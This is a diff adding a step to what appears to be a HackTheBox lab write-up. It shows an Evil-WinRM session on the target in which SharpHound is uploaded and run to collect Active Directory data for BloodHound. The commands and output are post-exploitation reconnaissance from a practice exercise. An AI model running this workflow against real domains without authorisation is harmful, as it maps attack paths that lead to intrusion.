@@ -350,3 +350,26 @@ No interesting privileges
 
 I think ill upload sharphound to the target to collect bloodhound data
 
+```python
+*Evil-WinRM* PS C:\Users\oliver\Desktop> upload SharpHound.exe
+                                        
+Info: Uploading /home/kali/htb/object/SharpHound.exe to C:\Users\oliver\Desktop\SharpHound.exe
+                                        
+Data: 1802240 bytes of 1802240 bytes copied
+                                        
+Info: Upload successful!
+*Evil-WinRM* PS C:\Users\oliver\Desktop> dir
+
+
+    Directory: C:\Users\oliver\Desktop
+
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+-a----        4/21/2026   7:59 AM        1351680 SharpHound.exe
+-ar---        4/21/2026   7:40 AM             34 user.txt
+
+
+*Evil-WinRM* PS C:\Users\oliver\Desktop> .\SharpHound.exe -c All
+
+```
